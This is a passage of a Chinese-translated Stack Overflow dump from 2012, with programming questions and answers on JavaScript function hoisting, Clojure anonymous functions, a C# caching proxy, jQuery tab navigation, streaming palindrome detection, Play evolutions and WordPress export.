join table2 as b on a.user_id = b.user_id
group by a.user_id 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-04-09T06:02:13.153

```
select a.user_ID,a.user,b.roles 
from table1 as a, table2 as b 
where a.user_ID=b.user_ID 
```

# javascript - if/else 语句中的函数声明？

> ID：10069204
> 
> 赞同：55
> 
> 时间：2012-04-09T05:17:54.397
> 
> 标签：javascript, function, scope

如何处理函数声明？

```
var abc = '';
if (1 === 0) {
  function a() {
    abc = 7;
  }
} else if ('a' === 'a') {
  function a() {
    abc = 19;
  }
} else if ('foo' === 'bar') {
  function a() {
    abc = 'foo';
  }
}
a();
document.write(abc); //writes "foo" even though 'foo' !== 'bar'
```

此示例在 Chrome 和 Firefox 中产生不同的输出。Chrome 输出`foo`，而 FF 输出`19`。

* * *

## 回答 #1

> 赞同：71
> 
> 时间：2012-04-09T05:51:06.213

当被问到这个问题时，ECMAScript 5 (ES5) 很流行。在 ES5 的严格模式下，函数声明不能​​嵌套在`if`块内，如问题所示。在非严格模式下，结果是不可预测的。不同的浏览器和引擎实现了自己的规则来处理块内的函数声明。

截至 2018 年，许多浏览器都支持 ECMAScript 2015 (ES2015)，以至于[现在允许在 blocks 中声明函数](http://www.ecma-international.org/ecma-262/6.0/#sec-block)。在 ES2015 环境中，块内的函数声明将被限定在该块内。问题中的代码将导致未定义函数错误，因为该函数`a`仅在语句范围内`if`声明，因此不存在于全局范围内。

如果你需要有条件地定义一个函数，那么你应该使用[函数表达式](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Functions#Constructor_vs._declaration_vs._expression)。

* * *

## 回答 #2

> 赞同：7
> 
> 时间：2012-04-09T05:29:02.247

来自[http://javascriptweblog.wordpress.com/2010/07/06/function-declarations-vs-function-expressions/](http://javascriptweblog.wordpress.com/2010/07/06/function-declarations-vs-function-expressions/)

在 javascript 中，你有函数声明：

```
function foo() {
} 
```

和函数表达式

```
var foo = function() {
} 
```

引自[http://www.adequatelygood.com/2010/2/JavaScript-Scoping-and-Hoisting](http://www.adequatelygood.com/2010/2/JavaScript-Scoping-and-Hoisting)

> “函数声明和函数变量总是被 JavaScript 解释器移动（'提升'）到其 JavaScript 范围的顶部”。

因此，在您的第一个示例中发生的情况是 , 的函数声明`function a()`被提升到 Javascript 范围的顶部，因此即使 if 评估为 false 也会产生 'foo'

将`var foo`其视为普通的 Javascript 语句，它仅在您的 javascript 运行时执行，与 不同`function foo()`，这就是以下有效的原因：

```
alert(foo());

function foo() {
   return 'gw ganteng';
} 
```

在这里，`function foo()`由解析器解析，放入`foo()`当前范围，然后尝试调用`alert(foo())`

[http://javascriptweblog.wordpress.com/2010/07/06/function-declarations-vs-function-expressions/](http://javascriptweblog.wordpress.com/2010/07/06/function-declarations-vs-function-expressions/)

> 在 JavaScript 执行中，有 Context（ECMA 5 将其分为 LexicalEnvironment、VariableEnvironment 和 ThisBinding）和 Process（按顺序调用的一组语句）。进入执行范围时，声明有助于变量环境。它们与声明（例如退货）不同，不受其流程规则的约束。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2013-12-11T23:42:16.930

ECMA-262 v5 要求实现在进入任何新的全局或函数级执行上下文时在第一次传递期间注册所有函数和变量声明。Chrome 在技术上就是在这里做的，因为它在执行之前查看`else`and`then`块并注册。`a()`不幸的是，它会产生最难以理解的结果。

FF 在评估 if 语句并将函数和变量声明添加到当前上下文之前一直等到它评估。顺便提一句。两种浏览器都在 catch 和 finally 子句中这样做。

这实际上只是两个不同的 ECMA 实现处理一个不应该开始存在的特性的问题。手头的场景说明了为什么函数声明不应该在控制流语句中。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2021-02-05T02:50:22.063

### 函数声明不能​​在`{}`块外访问。

```
if (true) {
  function sayHi() {
    alert("hii");
  }
  sayHi(); //accessible
}

sayHi(); //error, not accessible since out of the block 
```

### 如果要定义条件函数，请使用函数表达式，例如

```
let sayHi;
if (true) {
  sayHi = function(){
    alert("hii");
  }
  sayHi(); //accessible
}

sayHi(); //accessible 
```

# android - 如何将字符串数据发送到java webservice？

> ID：10069206
> 
> 赞同：0
> 
> 时间：2012-04-09T05:17:57.833
> 
> 标签：android

我必须通过网络服务向数据库发送一长串数据。我不知道该怎么做。我的回应是

```
04-09 10:09:39.922: I/System.out(581): ********cust0=
Rajesh Kumar&cust1=
27&cust2=
 Mubarak Street&cust3=

Opposite to More Shopping Mall&cust4=
Mumbai&cust5=
10 Km&cust6=
ford fiesta&cust7=

ford fiesta&cust8=
36&cust9=
500000&cust10=
SelfUse&cust11=
No&cust12=
&cust13=

Easy&cust14=
Medium&cust15=
Good&cust16=
Good&cust17=
Flat&cust18=
Rented&cust19=

Easy&cust20=
Easy&cust21=
2&cust22=
3&cust23=
20000&cust24=
4&cust25=null&cust26=

Father&cust27=
bike&cust28=
kotak bank&cust29=
3&cust30=
3&cust31=
&cust32=
manager&cust33=

&cust34=
02223456789&cust35=
&cust36=
55000&cust37=
&cust38=
&cust39=
&cust40=
False&cust41=

&cust42=
&cust43=
&cust44=
1/1/0001 12:00:00 AM&cust45=
goodiving style&cust46=
goodiving style&cust47=

goodiving style&cust48=
goodiving style&cust49=
goodiving style&cust50=
goodiving style&cust51=
Rajesh Kumar&cust52=
27&cust55=
 Rajesh Kumar&cust56=
Rajesh Kumar 
```

我必须通过将所有这些数据发送到 java webservice 来将所有这些数据存储在数据库中。我怎样才能实现它？谢谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-09T05:36:25.610

使用您发送到 Web 服务数据库的所有字符串，仅将其连接到一个字符串中。

在服务器端字符串拆分后，使用 StringTokenizer，并存储在数据库中

并请使用任何符号字符对每个字符串进行分割..当你连接时

我觉得这对你有帮助..

# c# - 缓存服务调用

> ID：10069210
> 
> 赞同：0
> 
> 时间：2012-04-09T05:18:45.987
> 
> 标签：c#, .net, caching, distributed-caching

我想为缓存创建和方面。我需要知道如何从方法调用中创建缓存键并将其插入缓存中并返回值。是否有任何解决方案可用于这部分。我不需要完整的缓存解决方案

谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-09T08:52:36.720

我以前使用过[RealProxy](http://msdn.microsoft.com/en-us/library/system.runtime.remoting.proxies.realproxy.aspx)来实现此类功能。我在博客文章中展示了一些示例；[使用 RealProxy 拦截方法调用](http://www.devhost.se/blog/post/2011/04/09/Intercepting-method-invocations-using-RealProxy.aspx)。

缓存代理的快速示例，使用方法的哈希码（以确保具有相同参数的两个不同方法分别缓存）和参数。请注意，没有处理输出参数，只有返回值。（如果你想改变它，你需要改变它`_cache`来保存一个包含返回值和输出参数的对象。）此外，这个实现没有表单av线程安全。

```
public class CachingProxy<T> : ProxyBase<T> where T : class {
    private readonly IDictionary<Int32, Object> _cache = new Dictionary<Int32, Object>();

    public CachingProxy(T instance)
        : base(instance) {
    }

    protected override IMethodReturnMessage InvokeMethodCall(IMethodCallMessage msg) {
        var cacheKey = GetMethodCallHashCode(msg);

        Object result;
        if (_cache.TryGetValue(cacheKey, out result))
            return new ReturnMessage(result, msg.Args, msg.ArgCount, msg.LogicalCallContext, msg);

        var returnMessage = base.InvokeMethodCall(msg);

        if (returnMessage.Exception == null)
            _cache[cacheKey] = returnMessage.ReturnValue;

        return returnMessage;
    }

    protected virtual Int32 GetMethodCallHashCode(IMethodCallMessage msg) {
        var hash = msg.MethodBase.GetHashCode();

        foreach(var arg in msg.InArgs) {
            var argHash = (arg != null) ? arg.GetHashCode() : 0;
            hash = ((hash << 5) + hash) ^ argHash;
        }

        return hash;
    }
} 
```

# macros - #/% 在 clojure 宏中的嵌套

> ID：10069214
> 
> 赞同：5
> 
> 时间：2012-04-09T05:18:56.017
> 
> 标签：macros, clojure

我知道嵌套#,% 是不好的——但是，我经常发现自己编写简短的在线匿名函数，这些函数最终正好有2 层#/%。

因此，我很好奇，有没有办法告诉 clojure 每个 % 绑定到最近的（最小的封闭）#？

谢谢！

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-04-09T21:10:08.033

嵌套匿名函数非常好。您只需要使用非速记语法。

```
#(foo (bar %1)
      (baz %2)) 
```

相当于

```
(fn [x y]
  (foo (bar x)
       (bax y))) 
```

完整的变体可以任意嵌套。此外，如果您倾向于大量使用`map`，请`fn`考虑使用`for`代替（在我看来，这往往看起来更清晰）：

```
(map (fn [row]
       (map (fn [col]
              (+ (* 10 row) col))
            (range 3)))
     (range 3)) 
```

做同样的事情

```
(for [row (range 3)]
  (for [col (range 3)]
    (+ (* 10 row) col))) 
```

* * *

## 回答 #2

> 赞同：6
> 
> 时间：2012-04-09T06:14:10.740

clojure 不支持匿名函数的嵌套。

编辑：我的意思是“匿名函数” `#(...)`，不是`(fn ...)`。为混乱道歉。

# playframework-2.0 - 回滚进化

> ID：10069217
> 
> 赞同：24
> 
> 时间：2012-04-09T05:19:18.780
> 
> 标签：playframework-2.0, revert, playframework-evolutions

这个问题可能看起来很愚蠢，但我找不到任何关于如何在 Play 2.0 中回滚进化的说明。谷歌只找到说进化文件的“Downs”部分用于此目的的页面，仅此而已。任何指针或说明将不胜感激。

* * *

## 回答 #1

> 赞同：24
> 
> 时间：2012-04-16T11:43:44.520

**Downs**部分主要用于在脚本更改时恢复 Evolution 。也就是说，您有一个将*2.sql*应用于数据库的项目，然后，由于合并，源中的*2.sql*被修改。Play 将在旧版本上运行**Downs**，然后在新的 2.sql 上运行**Ups**，以确保数据库与代码库同步。

据我所知，没有办法自己触发**Downs**，因为 Evolution 的目的是准备数据库以使用您的代码，并且仅应用一个**Downs**步骤会使应用程序处于不一致的状态，并带有许多潜在的错误产生。

如果你真的需要恢复某些东西，那将是一个新的 Evolution (3.sql)，**Ups**将在其中进行所需的更改。

* * *

## 回答 #2

> 赞同：6
> 
> 时间：2015-06-11T09:40:04.480

对于 play 2.4.x，根据 play 文档，您只需要`Evolutions.cleanupEvolutions(database)`在测试后调用。见这里[https://www.playframework.com/documentation/2.4.x/ScalaTestingWithDatabases](https://www.playframework.com/documentation/2.4.x/ScalaTestingWithDatabases)

# android - Android 应用程序特定的视频文件保护

> ID：10069222
> 
> 赞同：0
> 
> 时间：2012-04-09T05:19:47.833
> 
> 标签：android, android-intent, android-ndk

我正在开发一个视频播放器应用程序，其中从内容管理服务器下载具有版权的视频。

我只需要设置这些视频文件对我的应用程序的访问权限，并受版权保护。如果用户在文件资源管理器中看不到这些文件会更好。 **我想知道有没有办法做到这一点？**

此外，我决定使用手机的内存作为存储介质， **我还想知道我的应用程序使用的视频文件是否存在内存限制/访问问题？**

提前致谢。

感谢和问候阿尼什

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-09T05:34:17.720

使用应用程序的内部存储。

```
/data/data/<application_package_name>/<your_directory_name (If possible start with "." prefix)> 
```

但即使任何 android 设备已**植根**，用户也可以轻松获取这些视频文件。因此，如果可能的话，请使用`Encryption-Decryption`这些视频文件（这些会使视频文件访问速度变慢）。

# javascript - Javascript左侧和顶部导航活动当前状态

> ID：10069225
> 
> 赞同：0
> 
> 时间：2012-04-09T05:19:58.390
> 
> 标签：javascript, jquery, html, css

在这方面需要 js 帮助。一页上有两个导航，一个侧导航和一个顶部导航协同工作。侧导航活动状态和顶部导航当前状态在单击和选择时突出显示，但是当单击第二个和第三个顶部导航链接时，将删除侧导航活动/选择状态。

这是HTML：

```
<div id="nav">
<ul>
  <li class="active"><a href="#SideNav1">Side Nav 1</a></li>
  <li><a href="#SideNav2">Side Nav 2</a></li>
</ul><br />

<div id="SideNav1">
  <ul>
      <li class="current">Side Nav 1 Top Nav 1</li>
      <p>Content here</p>  <br />                    
      <li><a href="#SideNav1TopNav2">Side Nav 1 Top Nav 2</a></li>  
      <p>Content here</p>  <br />              
      <li><a href="#SideNav1TopNav3">Side Nav 1 Top Nav 3</a></li>
      <p>Content here</p>    <br />             
    </ul>    
</div>

    <div id="SideNav2">
  <ul>
      <li class="current">Side Nav 2 Top Nav 2</li>
      <p>Content here</p>   <br />                  
      <li><a href="#SideNav2TopNav2">Side Nav 2 Top Nav 2</a></li>  
      <p>Content here</p>  <br />              
      <li><a href="#SideNav3TopNav3">Side Nav 2 Top Nav 3</a></li>
      <p>Content here</p>   <br />              
    </ul>    
</div>

    <div id="SideNav1TopNav2">
  <ul>
      <li><a href="#SideNav1">Side Nav 1 Top Nav 1</a></li>
      <p>Content here</p>  <br />                   
      <li class="current">Side Nav 1 Top Nav 2</li>  
      <p>Content here</p> <br />               
      <li><a href="#SideNav1TopNav3">Side Nav 1 Top Nav 3</a></li>
      <p>Content here</p>    <br />             
    </ul>    
</div>

    <div id="SideNav1TopNav3">
  <ul>
      <li><a href="#SideNav1">Side Nav 1 Top Nav 1</a></li>
      <p>Content here</p>    <br />                 
      <li><a href="#SideNav1TopNav3">Side Nav 1 Top Nav 2</a></li>  
      <p>Content here</p>  <br />              
      <li class="current">Side Nav 1 Top Nav 3</li>
      <p>Content here</p>   <br />              
    </ul>    
</div>

    <div id="SideNav2TopNav2">
  <ul>
      <li><a href="#SideNav2">Side Nav 2 Top Nav 1</a></li>
      <p>Content here</p>   <br />                  
      <li class="current">Side Nav 2 Top Nav 2</li>  
      <p>Content here</p>   <br />             
      <li><a href="#SideNav2TopNav3">Side Nav 2 Top Nav 3</a></li>
      <p>Content here</p>   <br />              
    </ul>    
</div>

    <div id="SideNav2TopNav3">
  <ul>
      <li><a href="#SideNav2">Side Nav 2 Top Nav 1</a></li>
      <p>Content here</p>    <br />                 
      <li><a href="#SideNav2TopNav3">Side Nav 2 Top Nav 2</a></li>  
      <p>Content here</p>    <br />            
      <li class="current">Side Nav 2 Top Nav 3</li>
      <p>Content here</p>     <br />            
    </ul>    
</div>

</div> 
```

这是js：

```
$(function() {
$('#nav div').hide();
$('#nav div:first').show();
$('#nav ul li:first').addClass('active');
$('#nav ul li a').click(function(){
    var currentTab = $(this).attr('href');
    var vis = $(currentTab).is(':visible');
    $('#nav div').hide();
    $('#nav ul li').removeClass('active');
    $(this).parent().addClass('active');
    if(vis) {
        $(currentTab).hide();
    } else {
        $(currentTab).show();
    }
}); 
}); 
```

和CSS：

```
.active {
    background:#008CDC;
}
.current {
        background:#ECEDED;
} 
```

动态代码在这里：

[http://jsfiddle.net/tqhHA/79/](http://jsfiddle.net/tqhHA/79/)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-09T06:09:33.513

这是一个示例，其中描述需求会产生大量成果。出于某种原因，Stack Overflow 社区（嗯，那些遵循 JavaScript 标签的社区）喜欢一个很好的“隐藏我，告诉我”问题。;-) 据我所知，要求如下：

1.  侧边导航应确定哪些内容出现在主区域
2.  每个主要区域都应包含自己的子导航
3.  活动侧导航应以不同的样式表示，并且可以通过标记预选
4.  活动子导航应以不同的样式表示，并且可以通过标记预选
5.  我没有深入回答的另一个要求很容易是：导航和子导航状态应被存储（例如，使用 cookie、localstorage API 或会话变量）以便在返回页面时进行检索。

就个人而言，我觉得如果“选项卡”是你想要的方式，你称之为“顶部导航”，但我以后称之为“子导航”，你可以轻松地使用 jQuery UI。我的示例不使用 jQuery UI。

* * *

（这是以下示例的小提琴：http: [//jsfiddle.net/tqhHA/85/](http://jsfiddle.net/tqhHA/85/)）

关于您的原始代码，首先要注意的是它缺少逻辑标记结构。具有 id 的 div`SideNav1`与`SideNav1TopNav2`. 这没有任何意义。然后，该 SEEM 中有两个项目`nav`应该是您的侧导航，但在名称方面不匹配。在“内容”区域，当前选项卡具有“当前”类（太棒了！），但没有用于切换内容的锚链接（哎呀！）。

不仅如此，它还是无效的标记（你不能让你的`<p>`元素穿插在你的`<li>`元素中。

让我们通过以下方式清理这一切：

1.  将有一个主导航（类似于您的原始`nav`列表）
2.  在任何给定时间，“内容区域”将仅由一个“内容”div 填充。
3.  子导航将遵循与主导航相同的模式。链接描述应该可见的内容。它只是同一件事，嵌套更深一层。将“内容”区域视为页面本身功能的较小版本。
4.  仅就提供示例代码而言，内容本身将揭示交互过程中应该发生的事情

的HTML：

```
<ul id="nav">
  <li><a href="#content1">Item 1</a></li>
  <li class="active"><a href="#content2">Item 2</a></li>
</ul>

<div id="content1" class="content">
  <ul>
    <li class="active"><a href="#tab1_1">Subnav 1</a></li>            
    <li><a href="#tab1_2">Subnav 2</a></li>               
    <li><a href="#tab1_3">Subnav 3</a></li>           
  </ul>   
  <div id="tab1_1">
    <p>This content should only be visible when Item 1 is selected from the
      main nav, and Subnav 1 is selected in the content area.</p>
  </div>
  <div id="tab1_2">
    <p>This content should only be visible when Item 1 is selected from the
      main nav, and Subnav 2 is selected in the content area. This <a href="#">fake anchor</a>
      shows that you can add anchors inside the tabs.</p>
  </div>
  <div id="tab1_3">
    <p>This content should only be visible when Item 1 is selected from the
      main nav, and Subnav 3 is selected in the content area.</p>
  </div>
</div>

<div id="content2" class="content">
  <ul>
    <li><a href="#tab2_1">Subnav 1</a></li>            
    <li><a href="#tab2_2">Subnav 2</a></li>               
    <li class="active"><a href="#tab2_3">Subnav 3</a></li>           
  </ul>   
  <div id="tab2_1">
    <p>This content should only be visible when Item 2 is selected from the
      main nav, and Subnav 1 is selected in the content area.</p>
  </div>
  <div id="tab2_2">
    <p>This content should only be visible when Item 2 is selected from the
      main nav, and Subnav 2 is selected in the content area.</p>
  </div>
  <div id="tab2_3">
    <p>This content should only be visible when Item 2 is selected from the
      main nav, and Subnav 3 is selected in the content area.</p>
  </div>
</div> 
```

​CSS 也进行了修订：

1.  如果我们要谈论侧面和顶部导航，让我们让它成为侧面和顶部。我们不会要求乐于助人的 SO 成员仅通过文本来解决问题。
2.  您可以对两种类型的导航使用相同的类 ( `active`)。你需要做的就是让它们与众不同

```
.active { background:navy; }
  .active a { color: white }

.content .active { background:yellow; }
  .content .active a { color: black; }

/* we're demoing sidebars... let's make it a SIDE bar! */
#nav, .content { float: left }
#nav { width: 100px; }
.content { width: 300px; margin-left: 24px;}

/* make the Subnav horizontal... more "tab"-like! */
.content li { display: inline-block } 
```

​好的，现在我们有一个文件。事情是这样的……以上所有可能都不是最好的方法。我已经敲响了警钟，因为有这么多 ID 以方便导航。我把它们留在里面是因为它与你的方法非常匹配，但它甚至不如它可能的模块化。无论如何，只是承认它不一定是理想的，但它会起作用。

JS 也是全新的。重要的是，如果我们已经有了适当的 HTML 结构，就很容易编写 JS！我认为内联注释已经提供了足够的文档，所以让我们开始吧：

```
var updateMain = function() {

    // just hide ALL content areas first, rather than micro-managing
    $('.content, .content div').hide();

    // with all hidden, reveal only the content areas that have become active
    var activeLinks = $('.active a');
    activeLinks.each(function() {
        var activeArea = $(this).attr('href');
        $(activeArea).show();
    });

};

$(document).ready(function() {
    updateMain();

    // Bind a click event to the all navigation items (both main and sub)
    $('#nav a, .content > ul a').on('click', function(event) {

        event.preventDefault(); // prevent default anchor behaviour

        var $parent = $(this).parent(); // jQ object of the list item containing the anchor clicked

        // only do stuff if user has not just clicked a nav that's already active
        if (!($parent.hasClass('active'))) {
            $parent.siblings().removeClass('active');
            $parent.addClass('active');
        }

        updateMain(); // with new active classes in place, show the correct content
    });
});​ 
```

底线是：我们所做的只是页面加载，然后在每次点击后，我们会显示与“活动”导航相关的内容。单击所做的只是更改“活动”，然后运行内容更新程序功能。

* * *

免责声明：

*   使用此处使用的技术，您可能会得到“无样式内容的 Flash”（FOUC），因为它是 JavaScript 进行隐藏。让 JavaScript 处理它更利于可访问性和 SEO。但是你可以研究破坏 FOUC 的技术。我没有进入这里。

*   希望您会看到如何构建内容和捕获事件。然后你可以发现改进的机会！显示/隐藏相关内容的一种流行方式是再次以不同的方式构造它，以便每个链接都位于内容之前，您可以做一个`$(this).next().show()`示例。有无数种方法可以剥这只猫的皮。

# algorithm - 如何检测回文的首次出现

> ID：10069230
> 
> 赞同：9
> 
> 时间：2012-04-09T05:20:39.757
> 
> 标签：algorithm, palindrome

假设您正在从字符流中读取，当您读取第一次出现的回文时，该函数应该返回。

回文的长度应该是**偶数**。

时间复杂度的要求是O(N)。

例子：

*   第一个字符：4
*   第二个字符：1
*   第三个字符：3
*   第四个字符：3
*   第 5 个字符：1
*   第6个字符：4，返回

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-04-09T05:24:49.923

当你读到第一个字符时返回，这是一个单字母回文。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-04-09T06:14:46.820

您需要对[Manacher's Algorithm](http://tristan-interview.blogspot.com/2011/11/longest-palindrome-substring-manachers.html)稍作修改。它允许您在线性时间内找到字符串中的所有回文。关于算法的事情，它实际上从左到右进行，在需要时“使用”新字符。所需的修改是您需要读取新字符，仅当您尝试访问它时。
停止，如果你找到回文，那会一直追溯到流的开头。

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2012-04-09T06:58:30.177

在大多数情况下，应该在线性时间 O(n) 内运行的一种近似解决方案是使用滚动哈希。

您跟踪字符串的哈希值及其反向。每次读取一个新字符时，都可以更新 O(1) 中的两个哈希值。然后比较两个哈希值，如果它们相等，则比较字符串及其保留值。如果这也是相等的，退出并且你得到一个回文。

例如，一个非常简单的滚动哈希函数是 hash(ck c(k-1).. c0) = (p^k*ck + p^(k - 1) * c(k - 1) + ... + c0 ) mod m 其中 p 是奇素数。

所以开始：

```
p = 17 // or your lucky prime number
m = 10^9 // ...
hash = 0
hash_rev = 0
str = ''
str_rev = ''
p_pow = 1    

while True
    read c
    append c to str
    prepend c to str_rev
    hash = (hash * p + c) mod m
    hash_rev = (hash_rev + p_pow * c) mod m
    p_pow = p_pow * p
    if hash == hash_rev
         if str == str_rev
             found str to be the first palindrome 
```

为了使其更快，您可以将哈希和 hash_rev 清除为 32 位整数并选择 m = 2^32。然后你可以忽略 (mod m) 操作。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-04-09T05:40:11.067

这个（未经测试的 C#）代码可以做到，但我认为它可能是 O(n^2)。任何人都可以确认/否认吗？

```
main()
{
    string str = "";
    char c1;
    char c2;

    while(true)
    {
        //has to be even, always get two chars at a time
        c1 = GetCharFromStream();
        c2 = GetCharFromStream();
        str += c1 + c2;
        if(isPalindrome(str))
        {
            Console.WriteLine(str);
            return;
        }
    }
}

bool isPalindrome(string str)
{
    if (str.Length % 2 != 0)
        throw new InvalidArgumentException("str");

    int first = 0;
    int last = str.Length - 1;

    while(first <= last)
    {
        if(str[first] != str[last])
            return false;

        first++;
        last--;
    }

    return true;
} 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-04-10T05:05:19.830

使用 Hashset 怎么样？

假设输入流是`1221`.

```
Hashset = empty;

if(hashset does not contain the inputelement)
{
   add to hashset. // 12 will be in the hashset. //413 for your example.
}

else
{
  delete from Hashset. // First deletes 2 and then 1\. // First deletes 3, then 1 then 4.

  if(hashset is empty)
    return true; //Hashset is empty. return true.
} 
```

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2012-04-10T16:16:26.480

这是我的看法。*它从字符串的当前中间*扫描每个新符号上的累积字符串，因此如果当前字符串不是回文，它将快速失败。

```
class PalindromeDetector {
    private static class DetectorImpl {
        final ArrayList<Character> string = new ArrayList<Character>(32);

        boolean addSymbol(char symbol) {
            string.add(symbol);
            return check();
        }

        private boolean check() {
            if (string.size() < 2)
                return false;

            int lowBound = string.size() / 2 - 1;
            int hiBound = lowBound + 1;
            while (lowBound >= 0 && string.get(lowBound) == string.get(hiBound)) {
                lowBound --; hiBound ++;
            }
            return lowBound == -1;
        }
    }

    static boolean isPalindrome(String s) {
        DetectorImpl detector = new DetectorImpl();
        int index = 0;
        while (index < s.length())
            if (detector.addSymbol(s.charAt(index++)))
                return true;
        return false;
    }
} 
```

这是代码的单元测试：

```
@Test
public void test() {
    assertFalse(PalindromeDetector.isPalindrome("4"));
    assertTrue(PalindromeDetector.isPalindrome("44"));

    assertFalse(PalindromeDetector.isPalindrome("4343"));
    assertTrue(PalindromeDetector.isPalindrome("4334"));

    assertFalse(PalindromeDetector.isPalindrome("41331"));
    assertTrue(PalindromeDetector.isPalindrome("413314"));
} 
```

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2012-04-11T20:47:16.157

好的，因为我的第一个答案具有`O(n^2)`时间复杂性，所以这是另一个，`O(n)`按要求。

```
class PalindromeDetector {
    private static class DetectorImpl {
        int firstHalfSum, secondHalfSum;
        int size = 0, tensPower = 1;

        boolean add(int v) {
            if (size % 2 == 1) {
                firstHalfSum = firstHalfSum + (secondHalfSum / tensPower) * tensPower;
                secondHalfSum = (secondHalfSum % tensPower) * 10 + v;
                if (firstHalfSum == secondHalfSum)
                    return true;
            } else {
                secondHalfSum = secondHalfSum * 10 + v;
            }

            size ++;
            if (size % 2 == 0)
                tensPower *= 10;

            return false;
        }
    }

    static boolean isPalindrome(String s) {
        if (s == null || s.length() == 0)
            return false;

        int val = Integer.parseInt(s);
        int tensPower = s.length() == 1 ? 1 : (int) (Math.pow(10, s.length() - 1));
        DetectorImpl detector = new DetectorImpl();
        while (tensPower > 0) {
            int digit = val / tensPower;
            if (detector.add(digit))
                return true;

            val = val % tensPower;
            tensPower /= 10;
        }

        return false;
    }
} 
```

这是单元测试：

```
@Test
public void test() {
    assertFalse(PalindromeDetector.isPalindrome("4113"));
    assertTrue(PalindromeDetector.isPalindrome("3443"));
    assertTrue(PalindromeDetector.isPalindrome("473374"));
    assertTrue(PalindromeDetector.isPalindrome("413314"));
} 
```

答案假设输入由十进制数字组成，但可以很容易地扩展为字母数字输入（假设英文字母 + 10 位为我们提供基于 36 的数字系统）。

* * *

## 回答 #8

> 赞同：0
> 
> 时间：2012-04-14T01:10:38.320

这个解决方案（在 Haskell 中）依赖于对偶数长度回文在其中心包含重复字符的观察。当我们从输入流中读取字符时，我们会测试这样的对，当找到一个时，我们会播种一个新的候选答案。对于每个候选回文，我们还保留一个“剩余要匹配的字符”列表，并且在读取每个新字符时，我们将其与该列表进行匹配——如果没有匹配，候选者将被丢弃。当匹配列表为空时，已找到解决方案。请注意，虽然每个候选者都维护自己的匹配列表，但这些都只是同一列表的后缀，因此在 Haskell 中，这些都将共享空间，并且即使有很多候选者，它们也不会占用超过 O(n) 的空间。

在答案中心只有一个配对字符并且因此没有“误报”候选者的最佳情况下，时间复杂度为 O(n) - 每个字符检查不超过两次。对于具有许多错误开始的输入字符串，即“abbbbbbbbbbbbba”，我不确定时间复杂度 - 它可能不再是 O(n) 但它比 O(n^2) 更好，因为没有候选人能活得更久`min(k, n-k)`而不是`k`候选人中心的位置。

```
filter_map::(a -> Maybe a)->[a]->[a]
filter_map op = foldr (maybeCons . op) []
  where maybeCons Nothing  ys = ys
        maybeCons (Just y) ys = y:ys

-- Return the first prefix of the input argument that
-- is an even-length palindrome.
prefix_palindrome::(Eq a)=>[a]->[a]
prefix_palindrome (x:xs) = search [x] [] xs
  where search seen ([]:_) _ = seen
        search (s:seen) candidates (x:xs) | x == s = search seen' (candidates' ++ [seen]) xs
                                          | otherwise = search seen' candidates' xs
          where seen' = (x:s:seen)
                candidates' = filter_map extend candidates
                              where extend (c:cs) | c == x = Just cs
                                                  | otherwise = Nothing 
```

# jquery-ui - 防止 jQueryUI 选项卡显示未修改的 HTML

> ID：10069234
> 
> 赞同：1
> 
> 时间：2012-04-09T05:21:28.940
> 
> 标签：jquery-ui

使用 jQueryUI 选项卡的页面有时会在修改为选项卡之前显示原始标记：

![在此处输入图像描述](../Images/964ce9c6f7907abe9f33e782e8ee7441.png)

当我看到这个时，它会显示大约 0.2 - 1.0 秒。

如何防止显示原始标记？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-09T06:49:43.657

那东西叫做FOUC（无样式内容的Flash）。解决方案是使用 css 隐藏包含该选项卡的 div，并在加载整个页面后使用 javascript 将其显示回来。

```
$(window).load(function () {
   $('#your-tabbed-bar-div').show();
}); 
```

更多信息可以在这里找到：http: [//www.bluerobot.com/web/css/fouc.asp/](http://www.bluerobot.com/web/css/fouc.asp/) http://paulirish.com/2009/avoiding-the-fouc-v3/

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-09T05:32:50.917

听起来好像有一些 javascript 在 jquery ui 内容之前执行，所以它可以像重新排列 js 标签的顺序一样简单吗？

如果这不起作用，我会建议一个 hack - 确保将样式加载到页面上，如果文件下载速度不够快，这是值得怀疑的，因为浏览器很可能会缓存文件，而这可能不是一开始就很大 - 无论如何，您可以复制样式并确保它们快速加载，然后专门在 html 中设置列​​表元素的类属性。

如果您不喜欢那个 hack，那么这个 hack 怎么样 - 将列表样式设置为 display:none，然后运行使用 setTimeout 继续检查您想要查看的样式属性 - 当它存在时，将显示设置为阻止（或其他），当然在你看到它之后停止检查属性。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-04-09T05:56:07.713

这在[jQuery UI 文档](http://jqueryui.com/demos/tabs/#...prevent_a_FOUC_.28Flash_of_Unstyled_Content.29_before_tabs_are_initialized)中有介绍。

# wordpress - 如何导出具有完整设置的 Wordpress？

> ID：10069235
> 
> 赞同：1
> 
> 时间：2012-04-09T05:21:30.517
> 
> 标签：wordpress

我知道 wordpress 可以以 XML 的形式导出，但是在将其导入到另一个位置后，我们需要做一些小改动。有什么方法可以导出具有完整设置（如主题、小部件和其他设置等）的 wp...

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-09T05:46:43.283

您可以转储 MySQL 数据库并将其拉回新的 MySQL 服务器位置。但是，根据您需要进行哪些更改，插件等仍然需要安装在文件系统中。我会转移整个 MySQL 数据库，然后是所有 WordPress 文件，然后在转移后进行任何必要的更改（当然要为新主机上的新 MySQL 数据库设置修改 wp-config.php 文件）。

# html - 锚标记的href值中的特殊符号

> ID：10069237
> 
> 赞同：1
> 
> 时间：2012-04-09T05:21:42.403
> 
> 标签：html

# 和 ! 的作用是什么？在href值？

```
